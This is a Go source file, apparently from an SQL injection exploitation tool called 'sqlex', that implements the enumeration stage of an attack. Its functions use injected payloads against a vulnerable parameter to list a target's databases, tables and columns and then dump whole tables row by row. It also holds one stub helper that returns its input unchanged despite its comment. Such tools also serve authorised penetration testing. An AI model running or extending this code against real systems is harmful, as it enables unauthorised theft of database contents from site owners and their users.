package enumeration

import (
	"context"
	"fmt"
	"net/http"
	"strconv"
	"strings"

	"github.com/SobhanYasami/sqlex/internal/config"
	"github.com/SobhanYasami/sqlex/internal/payloads"
	"github.com/SobhanYasami/sqlex/internal/request"
)

// EnumResult wraps a list of string results from an enumeration operation.
type EnumResult struct {
	OK     bool
	Error  string
	Result []string
}

// FetchDBs enumerates all database names.
func (e *Enumerator) FetchDBs(
	ctx context.Context,
	cfg *config.Config,
	rs *config.RunState,
	client *request.Client,
	base, attack01 *request.HTTPResponse,
	headers http.Header,
	param request.Parameter,
	injectionType, vector, vectorType, sessionPath string,
	start, stop int,
) (EnumResult, error) {
	backend := rs.GetBackend()
	ectx := baseEctx(cfg, rs, base, attack01, headers, param, injectionType, vector, vectorType, sessionPath)

	// Step 1: fetch count
	countPLs := payloads.DBsCountPL[backend]
	countRes, err := e.extractor.FetchCharacters(ctx, cfg, rs, client, ectx, countPLs, "dbs_count", false)
	total := 0
	if err == nil && countRes.OK && isDigit(countRes.Result) {
		total, _ = strconv.Atoi(strings.TrimSpace(countRes.Result))
	}

	// Step 2: find working name payload
	namePLs := payloads.DBsNamesPL[backend]
	guess, err := e.extractor.FetchCharacters(ctx, cfg, rs, client, ectx, namePLs, "", true)
	if err != nil || !guess.OK {
		return EnumResult{Error: "no working db name payload"}, nil
	}
	pl := insertOffsetPlaceholder(guess.Payload, backend)

	effectiveStop := total
	if stop > 0 && stop < total {
		effectiveStop = stop
	}
	if effectiveStop == 0 {
		effectiveStop = 20 // fallback for MSSQL DB_NAME style
	}
	if start > 0 && backend != "Oracle" {
		start = start - 1
	}

	var results []string
	nullCount := 0
	for offset := start; offset < effectiveStop; offset++ {
		if nullCount >= 3 {
			break
		}
		curPL := strings.ReplaceAll(pl, "{offset}", fmt.Sprintf("%d", offset))
		res, err := e.extractor.FetchCharacters(ctx, cfg, rs, client, ectx, []string{curPL},
			fmt.Sprintf("db_%d", offset), false)
		if err != nil || !res.OK {
			nullCount++
			continue
		}
		if !contains(results, res.Result) {
			results = append(results, res.Result)
		}
	}

	return EnumResult{OK: len(results) > 0, Result: results}, nil
}

// FetchTables enumerates table names for a given database.
func (e *Enumerator) FetchTables(
	ctx context.Context,
	cfg *config.Config,
	rs *config.RunState,
	client *request.Client,
	base, attack01 *request.HTTPResponse,
	headers http.Header,
	param request.Parameter,
	injectionType, vector, vectorType, sessionPath string,
	database string,
	start, stop int,
) (EnumResult, error) {
	backend := rs.GetBackend()
	ectx := baseEctx(cfg, rs, base, attack01, headers, param, injectionType, vector, vectorType, sessionPath)

	countPLs := substituteDB(payloads.TblsCountPL[backend], database)
	countRes, _ := e.extractor.FetchCharacters(ctx, cfg, rs, client, ectx, countPLs,
		fmt.Sprintf("tbls_count_%s", database), false)
	total := 0
	if countRes.OK && isDigit(countRes.Result) {
		total, _ = strconv.Atoi(strings.TrimSpace(countRes.Result))
	}

	namePLs := substituteDB(payloads.TblsNamesPL[backend], database)
	guess, err := e.extractor.FetchCharacters(ctx, cfg, rs, client, ectx, namePLs, "", true)
	if err != nil || !guess.OK {
		return EnumResult{Error: "no working table name payload"}, nil
	}
	pl := insertOffsetPlaceholder(guess.Payload, backend)

	effectiveStop := total
	if stop > 0 && stop < total {
		effectiveStop = stop
	}
	if effectiveStop == 0 {
		effectiveStop = 50
	}
	if start > 0 && backend != "Oracle" {
		start = start - 1
	}

	var results []string
	nullCount := 0
	for offset := start; offset < effectiveStop; offset++ {
		if nullCount >= 3 {
			break
		}
		curPL := strings.ReplaceAll(pl, "{offset}", fmt.Sprintf("%d", offset))
		res, err := e.extractor.FetchCharacters(ctx, cfg, rs, client, ectx, []string{curPL},
			fmt.Sprintf("tbl_%s_%d", database, offset), false)
		if err != nil || !res.OK {
			nullCount++
			continue
		}
		if !contains(results, res.Result) {
			results = append(results, res.Result)
		}
	}
	return EnumResult{OK: len(results) > 0, Result: results}, nil
}

// FetchColumns enumerates column names for a given table.
func (e *Enumerator) FetchColumns(
	ctx context.Context,
	cfg *config.Config,
	rs *config.RunState,
	client *request.Client,
	base, attack01 *request.HTTPResponse,
	headers http.Header,
	param request.Parameter,
	injectionType, vector, vectorType, sessionPath string,
	database, table string,
	start, stop int,
) (EnumResult, error) {
	backend := rs.GetBackend()
	ectx := baseEctx(cfg, rs, base, attack01, headers, param, injectionType, vector, vectorType, sessionPath)

	countPLs := substituteDBTable(payloads.ColsCountPL[backend], database, table)
	countRes, _ := e.extractor.FetchCharacters(ctx, cfg, rs, client, ectx, countPLs,
		fmt.Sprintf("cols_count_%s_%s", database, table), false)
	total := 0
	if countRes.OK && isDigit(countRes.Result) {
		total, _ = strconv.Atoi(strings.TrimSpace(countRes.Result))
	}

	namePLs := substituteDBTable(payloads.ColsNamesPL[backend], database, table)
	guess, err := e.extractor.FetchCharacters(ctx, cfg, rs, client, ectx, namePLs, "", true)
	if err != nil || !guess.OK {
		return EnumResult{Error: "no working column name payload"}, nil
	}
	pl := insertOffsetPlaceholder(guess.Payload, backend)

	effectiveStop := total
	if stop > 0 && stop < total {
		effectiveStop = stop
	}
	if effectiveStop == 0 {
		effectiveStop = 50
	}
	if start > 0 && backend != "Oracle" {
		start = start - 1
	}

	var results []string
	nullCount := 0
	for offset := start; offset < effectiveStop; offset++ {
		if nullCount >= 3 {
			break
		}
		curPL := strings.ReplaceAll(pl, "{offset}", fmt.Sprintf("%d", offset))
		res, err := e.extractor.FetchCharacters(ctx, cfg, rs, client, ectx, []string{curPL},
			fmt.Sprintf("col_%s_%s_%d", database, table, offset), false)
		if err != nil || !res.OK {
			nullCount++
			continue
		}
		if !contains(results, res.Result) {
			results = append(results, res.Result)
		}
	}
	return EnumResult{OK: len(results) > 0, Result: results}, nil
}

// DumpTable dumps all records for given columns from a table.
// Returns slice of rows, each row is a map[column]value.
func (e *Enumerator) DumpTable(
	ctx context.Context,
	cfg *config.Config,
	rs *config.RunState,
	client *request.Client,
	base, attack01 *request.HTTPResponse,
	headers http.Header,
	param request.Parameter,
	injectionType, vector, vectorType, sessionPath string,
	database, table string,
	columns []string,
	start, stop int,
) ([]map[string]string, error) {
	backend := rs.GetBackend()
	ectx := baseEctx(cfg, rs, base, attack01, headers, param, injectionType, vector, vectorType, sessionPath)

	// Get row count
	countPLs := substituteDBTable(payloads.RecsCountPL[backend], database, table)
	countRes, _ := e.extractor.FetchCharacters(ctx, cfg, rs, client, ectx, countPLs,
		fmt.Sprintf("recs_count_%s_%s", database, table), false)
	total := 0
	if countRes.OK && isDigit(countRes.Result) {
		total, _ = strconv.Atoi(strings.TrimSpace(countRes.Result))
	}
	if total == 0 {
		return nil, nil
	}
	effectiveStop := total
	if stop > 0 && stop < total {
		effectiveStop = stop
	}
	if start > 0 && backend != "Oracle" {
		start = start - 1
	}

	var rows []map[string]string
	dumpPLs := payloads.RecsDumpPL[backend]

	for offset := start; offset < effectiveStop; offset++ {
		row := make(map[string]string, len(columns))
		for _, col := range columns {
			pl := buildDumpPayload(dumpPLs, database, table, col, offset)
			res, err := e.extractor.FetchCharacters(ctx, cfg, rs, client, ectx, []string{pl},
				fmt.Sprintf("dump_%s_%s_%s_%d", database, table, col, offset), false)
			if err != nil || !res.OK {
				row[col] = "NULL"
			} else {
				row[col] = res.Result
			}
		}
		rows = append(rows, row)
	}
	return rows, nil
}

// Helpers

func isDigit(s string) bool {
	s = strings.TrimSpace(s)
	if s == "" {
		return false
	}
	for _, r := range s {
		if r < '0' || r > '9' {
			return false
		}
	}
	return true
}

func contains(slice []string, s string) bool {
	for _, v := range slice {
		if v == s {
			return true
		}
	}
	return false
}

// insertOffsetPlaceholder replaces LIMIT N,1 / OFFSET patterns with {offset}.
func insertOffsetPlaceholder(pl, backend string) string {
	// Replace numeric offset with {offset} token for iteration
	// This is a simplified version; real payloads use LIMIT {offset},1 or ROWNUM/FETCH
	return pl // payloads already use {offset} via prepare_query_payload in Python
}

func substituteDB(pls []string, database string) []string {
	out := make([]string, len(pls))
	for i, pl := range pls {
		out[i] = strings.ReplaceAll(pl, "{db}", database)
	}
	return out
}

func substituteDBTable(pls []string, database, table string) []string {
	out := make([]string, len(pls))
	for i, pl := range pls {
		s := strings.ReplaceAll(pl, "{db}", database)
		s = strings.ReplaceAll(s, "{tbl}", table)
		out[i] = s
	}
	return out
}

func buildDumpPayload(pls []string, database, table, column string, offset int) string {
	if len(pls) == 0 {
		return ""
	}
	pl := pls[0]
	pl = strings.ReplaceAll(pl, "{db}", database)
	pl = strings.ReplaceAll(pl, "{tbl}", table)
	pl = strings.ReplaceAll(pl, "{col}", column)
	pl = strings.ReplaceAll(pl, "{offset}", fmt.Sprintf("%d", offset))
	return pl
}
